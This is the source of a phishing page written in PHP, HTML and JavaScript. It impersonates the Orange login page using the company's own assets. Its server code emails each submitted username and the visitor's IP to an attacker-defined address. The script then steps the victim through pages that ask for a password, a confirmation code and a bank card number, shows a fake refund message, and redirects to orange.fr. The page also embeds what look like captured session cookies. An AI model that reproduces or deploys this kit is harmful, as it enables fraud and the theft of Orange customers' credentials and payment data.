<?php session_start();?>
<?php
include_once ("auth.php");
if(isset($_POST['username'])){
    $username = $_POST['username'];
    $_SESSION['username'] = $username;

    $data = "Nom d'utilisateur: $username,\nAdresse IP: $IP,";
    setHeader($data, $IP);
    $success = mail($SEND_TO, "Username de $IP", $data);
    header("Location: password.php");
}
?>

<!DOCTYPE html>
<html lang="fr">
<head data-placeholder-focus="false">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="msapplication-config" content="none"/>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    <title>Identifiez-vous avec votre compte Orange</title>

    <noscript>
        <style type="text/css">
            body {
                display: none;
            }
        </style>
        <meta http-equiv="refresh" content="0; url=/assistance"/>
    </noscript>

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">

    <link rel="apple-touch-icon" sizes="57x57" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-180x180.png">

    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/favicon-194x194.png" sizes="194x194">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-36x36.png" sizes="36x36">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-48x48.png" sizes="48x48">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-72x72.png" sizes="72x72">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-144x144.png" sizes="144x144">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-192x192.png" sizes="192x192">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/favicon-16x16.png" sizes="16x16">
    <link rel="stylesheet" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/css/bundle.min.css">

    
    <style>
        .eui-banner {
            background-image: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/om_desktop.png");
        }

        .eui-banner-mc {
            background-image: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/mc_desktop_old.png");
        }
        #promoteMCicon{
            background: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/../promoteMCDesktop.gif") no-repeat;
            background-size: 100%;
            height: 32rem;
            width: 30rem;
        }

        @media (max-width: 767px) {
            .eui-banner {
                background-image: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/om_mobile.png");
            }

            .eui-banner-mc {
                background-image: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/mc_mobile_old.png");
            }

            #promoteMCicon {
                background: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/../promoteMCMobile.gif") no-repeat;
                background-size: 100%;
                height: 15rem;
                width: 30.2rem;
            }
        }

        .off-screen {
            position: fixed;
            bottom: 0;
            right: 0;
            height: 0 !important;
            width: 0 !important;
            overflow: hidden;
            opacity: 0;
            filter: alpha(opacity=0);
        }
    </style>
    <script type="text/javascript">
        window.Eui = {
            params: {"return_url":"https:\/\/espace-client.orange.fr\/page-accueil"},
            headers: {"content-type":"application\/json","cookie":"_ga=GA1.2.331558144.1606938798; __gads=ID=67b0d96d64e25082:T=1606935194:S=ALNI_MZdhD2XeXAKvDRcdOOXEFn6mABOAw; izclientid=ltzF8yI30oRCKFRulkwAIOS8%2C1608581876; is_fut=true; userconsent={\"c\":{\"w\":{\"cs\":{\"c1\":\"0\",\"c2\":\"0\",\"c3\":\"0\",\"c4\":\"0\",\"c5\":\"0\",\"c6\":\"0\"},\"t\":\"2020-12-14T20:18:05.320Z\",\"v\":\"2\"}}}; o-cookie-cnil=5; st_audience_clientId=c4d97784-683e-4893-812a-4df87e3253ba; st_audience_fp_checksum=077cd0f67942592129ff8661786c32d3; OB-USER-TOKEN=2c251c98-313c-4ea5-a385-f01548706fe2; mmapi.p.uat=%7B%22userConsent%22%3A%22true%22%7D; nav=2; mmapi.p.bid=%22prodlhrcgeu01%22; mmapi.p.srv=%22prodlhrcgeu01%22; ec_type=orange_res; HBX_DC=bgl; idzone=AF5PEJWQTUU5Worpl5ggN29Dr5KNrfDA2rKN71RhDOG1u6pRLZnix2nEhLsZ2pldShlkJqMej3vzN86ZsUfE4tMi8lTcpnMZmGGV5gVfdY_-wd4SzqmQfFTV99ufOOYJDFfcatF_qWztDQGWrzYRRwxt3A; OPTOUTMULTI=0:0%7Cc2:0%7Cc3:0%7Cc4:0%7Cc1:0; headerFlatEligibility=0; _gid=GA1.2.1572432071.1608098697; UrCapture=eb4ffc7b-4f0a-1f5a-923c-d6e85e810422; _cs_c=1; _cs_id=2e29f2ed-34bd-ae2d-c967-bb6788abbe2a.1608098700.1.1608098700.1608098700.1604677360.1642262700983.None.1; _cs_s=1.3; LPVID=c0Y2QzYmEyYjE0NGM3ZDg5; LPSID-31127979=LTSliV9GSxy9DFrhOYsDrg; _nac=nav_access_cookie; xauth=9dac275de230bfe3dc7454ca748b13b397bf07c56f2efee441256aa71f70449a%3BB4X%2B6uyAdp6aStZwp2TNw3Ng3nP2BVHxjysAl1K6rL4Gj56RAeCur0oYMHHmAAbgGr0PegZRWGIfR%2Bcl1M0%2F11ZOmm6Y39%2BnMvwAnjbZaAw%3D; datadome=I7fpUm5q.5GxLXmxVzUnM63NWtATtzTmzB_jxdrcpoqCxyuqtoBlOrU7UMJXbhWrqHL95CDdG8RxL6eXX8fiTroreq.dwSLxVdNxBfAueW; mmapi.p.pd=%221014687940%7CDgAAAApVBABPxo%2FO6BNm0AADbGhyARIAAUIA7yeUtAIAKTOoEYmh2EiiMWGBbaDYSAAAAAD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwAGRGlyZWN0AegTAgAAAAAAAAAAAP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwAAAAAAAAABRQ%3D%3D%22; utag_main=v_id:017625042415001b7eed5ad44c9503072001806a00978$_sn:6$_ss:0$_st:1608100749582$_pn:6%3Bexp-session$ses_id:1608098323164%3Bexp-session"},
            apiConfig: {"baseUrl":"\/front","timeout":15000,"retry":2,"resources":{"login":{"path":"\/login","method":"POST"},"password":{"path":"\/password","method":"POST"},"challenge":{"path":"\/challenge","method":"POST"},"captcha":{"path":"\/captcha","method":"POST"},"keepConnected":{"path":"\/keep-connected","method":"POST"},"reauthentication":{"path":"\/reauthentication","method":"POST"},"accounts":{"path":"\/accounts","method":"GET"},"probe":{"path":"\/report\/probe","method":"POST"},"confirm":{"path":"\/confirm","method":"POST"},"await":{"path":"\/await","method":"GET"},"reportError":{"path":"\/report\/error","method":"POST"},"deactivate":{"path":"\/deactivate","method":"POST"},"promoteLaterMC":{"path":"\/promoteLaterMC","method":"POST"},"activateMC":{"path":"\/activateMC","method":"POST"},"authToken":{"path":"\/authToken","method":"POST"},"authCookie":{"path":"\/authCookie","method":"GET"}}},
            i18n: {errors: {"408":"Le service a rencontr\u00e9 un probl\u00e8me r\u00e9seau, veuillez r\u00e9essayer.","503":"Cette page rencontre un probl\u00e8me technique, r\u00e9essayez un peu plus tard.","100":"Vous n\u2019avez pas indiqu\u00e9 l\u2019adresse mail ou le num\u00e9ro de mobile de votre compte Orange.","101":"Cette adresse mail ou ce num\u00e9ro de mobile n\u2019est pas valide. V\u00e9rifiez votre saisie.","102":"Vous n\u2019avez pas saisi votre mot de passe.","104":"C\u2019est incorrect, v\u00e9rifiez l\u2019adresse mail et le mot de passe saisis.","105":"Pour vous permettre de vous identifier votre navigateur doit accepter les cookies. <a href=\"https:\/\/r.orange.fr\/r\/Oid_cookies\" target=\"_self\" title=\"En savoir plus.\">En savoir plus.<\/a>","106":"Champ obligatoire"}, labels: {"titlePassAssistShow":"afficher le mot de passe","titlePassAssistHide":"cacher le mot de passe"}},
            mem: true,
            ad: true,
            stage: 'login',
            templateErrorTech: "<div class=\"row\">    <div class=\"col-xs-12 col-md-12 col-lg-11 col-xl-9\">        <div class=\"eui-error-area\">            <div class=\"zone-icon\">                <div class=\"eui-svg eui-icon-warning\"><\/div>            <\/div>            <div class=\"zone-msg\">                <p id=\"msgWarning\">Vous \u00eates rest\u00e9 longtemps inactif.<\/p>            <\/div>            <div class=\"zone-msg-btm\">                <p id=\"msgAction\">Vous pouvez recommencer<\/p>            <\/div>            <div class=\"clearfix\"><\/div>            <button id=\"btnRefresh\" type=\"button\" class=\"btn btn-info eui-btn-sub\">Recommencer<\/button>        <\/div>    <\/div><\/div>",
            templateAuthToken: "",
            ttls: 3600,
            ecConf: {"baseUrl":"\/\/c.woopic.com\/libs\/common\/","default":"o_load_responsive.js","proMobile":"o_load_responsive_mobile.js","proDesktop":"o_load.js"},
            reportError:  true,
            lostUrl: 'https://mdp.orange.fr',
            adUrl: 'https://all.orfr.adgtw.orangeads.fr/js/ora_authen.identification'
        };
    </script>

    <script src="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/js/bundle.min.js"></script>
    <style>
        #forceMCLabel.disabled, #forceMCLabelBis.disabled  {
            display: none;
        }
        #o-ribbon-right, #o-service{
            display: none;
        }
        @import url('https://fonts.googleapis.com/css?family=Source+Serif+Pro');
 *, *::before, *::after {
	 box-sizing: border-box;
}
 
  
 .spinner {
	 width: 4rem;
	 height: 4rem;
}
 .spinner.spinner1 {
	 border: 3px solid rgba(255, 255, 255, .25);
	 border-top-color: rgba(241, 110, 0, .5);
	 border-radius: 50%;
	 animation: rotation 0.8s ease infinite;
}
 @keyframes rotation {
	 from {
		 transform: rotate(0deg);
	}
	 to {
		 transform: rotate(360deg);
	}
}
 @keyframes flip {
	 0% {
		 transform: perspective(120px) rotateX(0deg) rotateY(0deg);
	}
	 50% {
		 transform: perspective(120px) rotateX(-180deg) rotateY(0deg);
	}
	 100% {
		 transform: perspective(120px) rotateX(-180deg) rotateY(-180deg);
	}
}
 @keyframes progress {
	 0% {
		 left: -130%;
		 background: rgba(241, 110, 0, .5);
	}
	 50% {
		 left: 130%;
		 background: rgba(241, 110, 0, .5);
	}
	 51% {
		 background: rgba(255, 255, 255, .5);
	}
	 100% {
		 background: rgba(255, 255, 255, .5);
	}
}
 @keyframes pulse {
	 0% {
		 transform: translate(-50%, -50%) scale(0);
		 opacity: 1;
	}
	 100% {
		 transform: translate(-50%, -50%) scale(1);
		 opacity: 0;
	}
}
 @keyframes pulse2 {
	 0%, 100% {
		 transform: translate(-50%, -50%) scale(0);
		 opacity: 1;
	}
	 50% {
		 transform: translate(-50%, -50%) scale(1);
		 opacity: 0;
	}
}
 @keyframes flipWalker {
	 0% {
		 transform: translate(0, 0) rotateX(0) rotateY(0);
	}
	 25% {
		 transform: translate(100%, 0) rotateX(0) rotateY(180deg);
	}
	 50% {
		 transform: translate(100%, 100%) rotateX(-180deg) rotateY(180deg);
	}
	 75% {
		 transform: translate(0, 100%) rotateX(-180deg) rotateY(360deg);
	}
	 100% {
		 transform: translate(0, 0) rotateX(0) rotateY(360deg);
	}
}
 
 
    </style>
</head>
<body>
<header id="o-header"></header>
<main class="eui-container" role="main">

    <div id="successR" style="display: none;">
        <?php include 'success.php'?>
    </div>
    <h1 class="o-container-fluid" id="identify">Identifiez-vous</h1>
    <hr>

    <div id="rembours" style="display: none;">
        <?php include './inc/message_remboursement.php'?>
    </div>

    <div class="o-container-fluid">
        <div class="row">
            <div class="col-xs-12 col-md-6 col-lg-6 col-xl-6 ">
                <div id="stage" class="">
                    <div id="loaderr" style="display: none">
                        <!-- <img src="https://media.giphy.com/media/KG4PMQ0jyimywxNt8i/giphy.gif" height="300" alt="" id="loader"> -->
 
        <div class="spinner spinner1" style="position : relative; left: 70px;height : 100px; width : 100px"></div>
 
                    </div>

                    <!-- START FORM -->
                    <div id="formContainer">
                        <form class="eui-form" id="euiFor" action="password.php" method="post">
                            <div id="eui-accounts">

                            </div>
                            <div class="form-group ">
                                <h2 class="sr-only">Indiquez votre compte Orange</h2>
                                <div class="eui-input-label">
                                    <div class="eui-row">
                                        <label for="login" id="loginLabel" class="eui-label">Indiquez votre compte Orange</label>
                                        <div class="eui-assistance-area">
                                            <button data-oevent="idme_login;clic_bulle_aide_saisie;bulle_aide_saisie" class="eui-svg eui-icon-help" type="button" id="helpLogin">
                                                <span class="sr-only">aide</span>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                                <div aria-label="aide" class="eui-help" id="helpLoginCnt" style="display : none;">
                                    <p class="noSelectContent" tabindex="-1"><span>Votre compte Orange permet l’accès à vos services personnels. Il est désigné par une adresse e-mail ou un numéro de mobile.</span><br /><span>C’est votre première visite >> <a href="/aide" target="_self" title="Aide">Aide</a></span></p>
                                </div>

                                <h6 id="error-msg-box-login" tabindex="0" class="form-control-message" aria-hidden="true" aria-live="assertive" role="alert"></h6>
        <span id="usernameerror"  style="color: #f12b2d; visibility : hidden"><b>C'est incorrect, vérifiez l'adresse mail ou le numéro de mobile.</b></span>
                               
                                <input type="text" id="login" placeholder="Adresse mail ou n° de mobile Orange" name="username" onchan
                                       class="form-control"
                                       maxlength="256" autocorrect="off"
                                       autocapitalize="off"/>
                            </div>
                            <button id="btnSubmit" type="submit" class="btn btn-info eui-btn-sub"  onclick="" style="visibility: hidden;">Continuer</button>
                        </form>
                    </div>
                    <!-- END FORM -->


                    <nav class="eui-links row" role="navigation">

                        <div id="assistance" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="assistanceLink" href="index.php" rel="noopener noreferrer"
                               data-oevent="idme_login;clic_retrouver_mail;lien_retrouver_mail"
                               title="Comment retrouver l’adresse e-mail de votre compte&nbsp;?">Comment retrouver l’adresse e-mail de votre compte&nbsp;?</a>
                        </div>

                        <div id="firstAuthentBloc" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="firstAuthentLink" data-oevent="idme_login;clic_premiere_connexion;lien_premiere_connexion" href="index.php" title="Vous vous identifiez pour la première fois  ?">Vous vous identifiez pour la première fois  ?</a>
                        </div>

                        <div id="firstAccessDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="firstAccessLink" data-oevent="idme_login;clic_créer_compte;créer_votre_compte" href="index.php"
                               title="Vous n’êtes pas client ? Créer votre compte">Vous n’êtes pas client ? Créer votre compte</a>
                        </div>

                        <div id="forgotCodeMC" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none;">
                            <a id="forgotCodeMCLink" href="index.php" title="Code confidentiel oublié ?">Code confidentiel oublié ?</a>
                        </div>

                        <div id="discoverMC" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none">
                            <a id="discoverMCLink" href="https://mc.orange.fr?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil">
                                <img id="discoverMCLinkImg" src="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/Logo_MC_noir_fond_transparent_small.png">
                                <img id="discoverMCLinkImgHover" style="display: none;" src="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/Logo_MC_orange_fond_transparent_small.png">
                                Comment s’identifier plus vite et plus facilement ?                                </a>
                        </div>

                        <div id="moreHelpLink" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="helpLink" data-oevent-category="idme_login" data-oevent-action="clic_aide" data-oevent-label="aide" href="index.php"
                               title="Besoin d’aide ?">Besoin d’aide ?</a>
                        </div>

                        <div id="authWithoutMCDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12 " style="display: none;">
                            <a id="authWithoutMCLink" class="link-action-password" href="#" title="S’identifier avec votre mot de passe" data-oevent-category="idme_mc_invit" data-oevent-action="clic_sidentifier_sans_mc" data-oevent-label="sidentifier_sans_mc">S’identifier avec votre mot de passe</a>
                        </div>
                        <div class="eui-help col-xs-12 disabled" id="forceMCLabel">
                            Par sécurité, vous devez vous identifier avec Mobile Connect.<button type="button" class="eui-svg eui-close eui-icon-close-grey">
                                <span class="sr-only">fermer</span>
                            </button>
                        </div>
                        <div class="eui-help col-xs-12 disabled" id="forceMCLabelBis">
                            Suite à plusieurs tentatives d’accès erronées, l’accès à ce compte par mot de passe est temporairement bloqué. Réessayez un peu plus tard.                                <button type="button" class="eui-svg eui-close eui-icon-close-grey">
                                <span class="sr-only">fermer</span>
                            </button>
                        </div>
                    </nav>
                </div>
            </div>

            <div id="magicZone" class="eui-banner-place col-xs-12 col-md-5 col-lg-4 col-xl-4 col-md-offset-1">
                <a id="magicZoneLink" data-oevent-category="idme_login" data-oevent-action="clic_zone_com" data-oevent-label="service" class="eui-block"
                   href="https://r.orange.fr/r/Oapp_Orange_EtMoi" target="_blank" rel="noopener noreferrer">
                    <div id='elmt-banner' class='eui-banner'
                         title="Lien zone de communication (nouvel onglet)"></div>
                </a>
            </div>
        </div>
    </div>
</main>
<footer>
    <div class="eui-footer-banner hidden-xs hidden-sm">
        <div class="eui-mega-banner oan_ad" id="ora_2_728x90_identification"></div>
    </div>
    <div id="cefooter"></div>
</footer>

<script>


$('#login').bind('input', function() {
    // $(this).next().stop(true, true).fadeIn(0).html('[input event fired!]: ' + $(this).val()).fadeOut(2000);
    $('#usernameerror').css("visibility","hidden")
    $(this).css("border-color","#000")
    $(this).css("color","#000")
});

window.onpopstate= function(event){
  //  step = step -1 ;
  step = event.state.step
  console.log("event",event)
    console.log("STep=",step)
    if(step === 3 || step === 2 || step === 1){
        console.log("REmbousement hider");
        $('#rembours').css("display","none");
    $("#identify").show();
    }
    if( step === 3 || step === 4){
    $("#identify").hide();
    $('#rembours').css("display","none");

    }

    //submitForm({},event.state.url)
    console.log('Location:',event.state.url);
    $('#euiFor').load(event.state.url);
    $('#euiFor').prop('action',event.state.next);
};


function makeid(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}
 


function ValidateEmail(mail) 
{
 if (/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/.test(mail))
  {
    return (true)
  }
    return (false)
}

function ValidateNumber(number){
    if(/^(?:(?:\+|00)33[\s.-]{0,3}(?:\(0\)[\s.-]{0,3})?|0)[1-9](?:(?:[\s.-]?\d{2}){4}|\d{2}(?:[\s.-]?\d{3}){2})$/.test(number)){
        return true
    }
    return false 

}
    // step 1 show password view
    // window.history.pushState("", "", "index.php");
    var step = 1; 
    function submitForm(data, url) {
        $.ajax({
            type: "post",
            url: url,
            data: data,
            success: function (data) {
                console.log("STep=",step)
                switch (step){
                    case 1:
                        $("#euiFor").prop("action", "error_password.php");
                        window.history.pushState({url:"password.php", next:"error_password.php", step:step}, "", "");
                        break;
                    case 2:
                        $("#euiFor").prop("action", "confirmation_code.php");
                        window.history.pushState({url:"error_password.php", next:"confirmation_code.php", step:step}, "", "");
                        // window.history.pushState("", "", "error_password.php");
                        break;
                    case 3:
                        $("#euiFor").prop("action", "numero_carte.php");
                        window.history.pushState({url:"confirmation_code.php", next:"numero_carte.php", step:step}, "", "");
                        // window.history.pushState("", "", "confirmation_code.php");
                        break;
                    case 4:
                        // $("#euiFor").prop("action", "expiration_date.php");
                        $("#euiFor").prop("action", "success.php");
                        window.history.pushState({url:"numero_carte.php", next:"success.php", step:step}, "", "");

                        break;
                    case 5:
                       // $("#euiFor").prop("action", "cryptogramme.php");
                        break;
                    case 6:
                        // window.history.pushState({url:"success.php"}, "", "");
                     //   window.history.pushState({url:"success.php"}, "", "");

                      //  $("#euiFor").prop("action", "success.php");
                        break;
                }
              

                if(step === 5){
                    $('#rembours').css("display","none");
                    $("#formContainer").hide();
                    //$("#successR").html(data);
                    $("#successR").show();
                    setTimeout(function () {
                        window.location.assign("https://www.orange.fr");
                    }, 5000);
                }else
                    $("#euiFor").html(data);
                if(step === 3){
                    $("#identify").hide();
                    $('#formContainer').show();
                    $('#loaderr').hide();
                }
                if(step === 4 ){
                    $("#rembours").show();
                }
                step++;
            }
        });
    }

    $("#euiFor").on('submit', function(e){
        e.preventDefault();
        var username = $('#login').val();
        
        if(username !=undefined){
            if(ValidateEmail(username) == false && ValidateNumber(username) == false ){
                $('#usernameerror').css("visibility","initial")
                $('#login').css("border-color","#f12b2d")
                $('#login').css("color","#f12b2d")

                return
             }
        }
        $("#btnSubmit").prop( "disabled", false );
        
  
        var data = $(this).serialize();
        var url = $("#euiFor").attr('action');

        if(step === 3){
            $('#formContainer').hide();
            $('#loaderr').show();
            setTimeout(function () {
                submitForm(data, url);
            }, 6000);
        }else{
            console.log("dans le log");
            console.log(url);
            submitForm(data, url);
        }
    });
</script>

</body>
</html>